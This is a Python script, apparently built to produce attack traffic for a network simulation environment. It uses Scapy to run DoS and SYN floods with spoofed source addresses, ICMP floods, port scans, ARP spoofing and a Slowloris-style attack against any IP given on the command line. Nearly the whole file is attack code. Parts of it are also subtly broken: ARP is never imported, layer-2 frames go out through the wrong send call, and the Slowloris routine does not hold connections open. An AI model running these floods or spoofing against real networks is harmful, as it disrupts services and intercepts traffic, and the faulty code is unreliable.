#!/usr/bin/env python3
"""
Attack Simulation Module for Network Simulation Environment
This script implements various network attacks for the simulation environment.
"""

import random
import time
import threading
import logging
import os
import sys
from scapy.all import IP, TCP, UDP, ICMP, Ether, RandIP, RandMAC, send, srp1, sr1
from scapy.layers.http import HTTP, HTTPRequest

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('../logs/attack_simulation.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger('attack_simulator')

class AttackSimulator:
    """
    Class to simulate various network attacks
    """
    
    def __init__(self, attacker_ip, target_ip, interface='eth0'):
        """
        Initialize the attack simulator
        
        Args:
            attacker_ip (str): IP address of the attacker
            target_ip (str): IP address of the target
            interface (str): Network interface to use
        """
        self.attacker_ip = attacker_ip
        self.target_ip = target_ip
        self.interface = interface
        self.attack_types = {
            'dos': self.dos_attack,
            'port_scan': self.port_scan,
            'syn_flood': self.syn_flood,
            'ping_flood': self.ping_flood,
            'arp_spoofing': self.arp_spoofing,
            'slowloris': self.slowloris
        }
        logger.info(f"Attack simulator initialized: {attacker_ip} -> {target_ip}")
        
        # Create a directory for attack data if it doesn't exist
        if not os.path.exists('../data/attacks'):
            os.makedirs('../data/attacks')
    
    def generate_attack_data(self, attack_type, duration=10, intensity=5):
        """
        Generate attack data for the specified attack type
        
        Args:
            attack_type (str): Type of attack to simulate
            duration (int): Duration of attack in seconds
            intensity (int): Intensity level of attack (1-10)
            
        Returns:
            dict: Attack metadata
        """
        if attack_type not in self.attack_types:
            logger.error(f"Unknown attack type: {attack_type}")
            return None
        
        logger.info(f"Starting {attack_type} attack simulation (duration: {duration}s, intensity: {intensity})")
        
        # Record attack metadata
        attack_id = f"{attack_type}_{int(time.time())}"
        attack_metadata = {
            'id': attack_id,
            'type': attack_type,
            'source_ip': self.attacker_ip,
            'target_ip': self.target_ip,
            'start_time': time.time(),
            'duration': duration,
            'intensity': intensity,
            'packets_sent': 0
        }
        
        # Start attack in a separate thread
        attack_thread = threading.Thread(
            target=self.attack_types[attack_type],
            args=(duration, intensity, attack_metadata)
        )
        attack_thread.daemon = True
        attack_thread.start()
        
        # Wait for attack to complete
        attack_thread.join()
        
        attack_metadata['end_time'] = time.time()
        logger.info(f"Completed {attack_type} attack simulation. Sent {attack_metadata['packets_sent']} packets")
        
        # Save attack metadata
        self._save_attack_metadata(attack_metadata)
        
        return attack_metadata
    
    def _save_attack_metadata(self, metadata):
        """Save attack metadata to a file"""
        import json
        filename = f"../data/attacks/{metadata['id']}.json"
        with open(filename, 'w') as f:
            json.dump(metadata, f, indent=2)
        logger.info(f"Saved attack metadata to {filename}")
    
    def dos_attack(self, duration, intensity, metadata):
        """
        Simulate a basic DoS attack by sending a large number of packets
        
        Args:
            duration (int): Duration of attack in seconds
            intensity (int): Intensity level (1-10)
            metadata (dict): Attack metadata to update
        """
        end_time = time.time() + duration
        packets_per_second = intensity * 50  # Scale intensity to packets per second
        
        while time.time() < end_time:
            for _ in range(int(packets_per_second)):
                # Create a random TCP packet
                packet = IP(src=self.attacker_ip, dst=self.target_ip) / \
                         TCP(sport=random.randint(1024, 65535), dport=80, flags="S")
                
                # Send the packet
                send(packet, verbose=0, iface=self.interface)
                metadata['packets_sent'] += 1
            
            # Sleep for a short time to control rate
            time.sleep(1)
    
    def port_scan(self, duration, intensity, metadata):
        """
        Simulate a port scan attack
        
        Args:
            duration (int): Duration of attack in seconds
            intensity (int): Intensity level (1-10)
            metadata (dict): Attack metadata to update
        """
        end_time = time.time() + duration
        ports_per_scan = min(100 * intensity, 1000)  # Scale intensity to ports per scan
        
        while time.time() < end_time:
            # Select a range of ports to scan
            start_port = random.randint(1, 65535 - ports_per_scan)
            end_port = start_port + ports_per_scan
            
            for port in range(start_port, end_port):
                # Create a SYN packet for port scanning
                packet = IP(src=self.attacker_ip, dst=self.target_ip) / \
                         TCP(sport=random.randint(1024, 65535), dport=port, flags="S")
                
                # Send the packet
                send(packet, verbose=0, iface=self.interface)
                metadata['packets_sent'] += 1
                
                # Sleep briefly to avoid overwhelming the network
                time.sleep(0.001)
            
            # Sleep between scans
            time.sleep(1)
    
    def syn_flood(self, duration, intensity, metadata):
        """
        Simulate a SYN flood attack
        
        Args:
            duration (int): Duration of attack in seconds
            intensity (int): Intensity level (1-10)
            metadata (dict): Attack metadata to update
        """
        end_time = time.time() + duration
        packets_per_second = intensity * 100  # Scale intensity to packets per second
        
        while time.time() < end_time:
            for _ in range(int(packets_per_second)):
                # Create a SYN packet with random source IP to make it harder to block
                packet = IP(src=RandIP(), dst=self.target_ip) / \
                         TCP(sport=random.randint(1024, 65535), dport=80, flags="S")
                
                # Send the packet
                send(packet, verbose=0, iface=self.interface)
                metadata['packets_sent'] += 1
            
            # Sleep for a short time to control rate
            time.sleep(1)
    
    def ping_flood(self, duration, intensity, metadata):
        """
        Simulate a ping flood (ICMP flood) attack
        
        Args:
            duration (int): Duration of attack in seconds
            intensity (int): Intensity level (1-10)
            metadata (dict): Attack metadata to update
        """
        end_time = time.time() + duration
        packets_per_second = intensity * 50  # Scale intensity to packets per second
        
        while time.time() < end_time:
            for _ in range(int(packets_per_second)):
                # Create an ICMP echo request packet
                packet = IP(src=self.attacker_ip, dst=self.target_ip) / ICMP()
                
                # Send the packet
                send(packet, verbose=0, iface=self.interface)
                metadata['packets_sent'] += 1
            
            # Sleep for a short time to control rate
            time.sleep(1)
    
    def arp_spoofing(self, duration, intensity, metadata):
        """
        Simulate an ARP spoofing attack
        
        Args:
            duration (int): Duration of attack in seconds
            intensity (int): Intensity level (1-10)
            metadata (dict): Attack metadata to update
        """
        end_time = time.time() + duration
        gateway_ip = '.'.join(self.target_ip.split('.')[:3] + ['1'])  # Assume gateway is x.x.x.1
        
        while time.time() < end_time:
            # Create an ARP packet claiming to be the gateway
            arp_packet = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") / \
                         ARP(op=2, psrc=gateway_ip, pdst=self.target_ip, hwsrc=RandMAC())
            
            # Send the packet multiple times based on intensity
            for _ in range(intensity):
                send(arp_packet, verbose=0, iface=self.interface)
                metadata['packets_sent'] += 1
            
            # Sleep between sends
            time.sleep(1)
    
    def slowloris(self, duration, intensity, metadata):
        """
        Simulate a Slowloris attack (slow HTTP headers)
        
        Args:
            duration (int): Duration of attack in seconds
            intensity (int): Intensity level (1-10)
            metadata (dict): Attack metadata to update
        """
        end_time = time.time() + duration
        max_connections = intensity * 10  # Scale intensity to number of connections
        
        # Create partial HTTP requests
        connections = []
        for _ in range(max_connections):
            # Create a partial HTTP request
            packet = IP(src=self.attacker_ip, dst=self.target_ip) / \
                     TCP(sport=random.randint(1024, 65535), dport=80, flags="S") / \
                     HTTPRequest(
                         Headers=[f"X-a: {random.randint(1, 5000)}"]
                     )
            
            connections.append(packet)
            metadata['packets_sent'] += 1
        
        # Send partial requests periodically to keep connections open
        while time.time() < end_time:
            for conn in connections:
                # Update the partial request with a new header
                conn[HTTPRequest].Headers = [f"X-a: {random.randint(1, 5000)}"]
                
                # Send the packet
                send(conn, verbose=0, iface=self.interface)
                metadata['packets_sent'] += 1
            
            # Sleep before sending more headers
            time.sleep(10)


def run_attack_simulation(attacker_ip='10.0.0.50', target_ip='10.0.0.100'):
    """
    Run a sample attack simulation
    
    Args:
        attacker_ip (str): IP address of the attacker
        target_ip (str): IP address of the target
    """
    simulator = AttackSimulator(attacker_ip, target_ip)
    
    # Run different types of attacks
    attack_types = ['dos', 'port_scan', 'syn_flood', 'ping_flood']
    
    for attack_type in attack_types:
        # Generate random duration and intensity
        duration = random.randint(5, 15)
        intensity = random.randint(3, 8)
        
        # Run the attack
        simulator.generate_attack_data(attack_type, duration, intensity)
        
        # Wait between attacks
        time.sleep(2)


if __name__ == '__main__':
    # If arguments are provided, use them as attacker and target IPs
    if len(sys.argv) > 2:
        run_attack_simulation(sys.argv[1], sys.argv[2])
    else:
        run_attack_simulation()
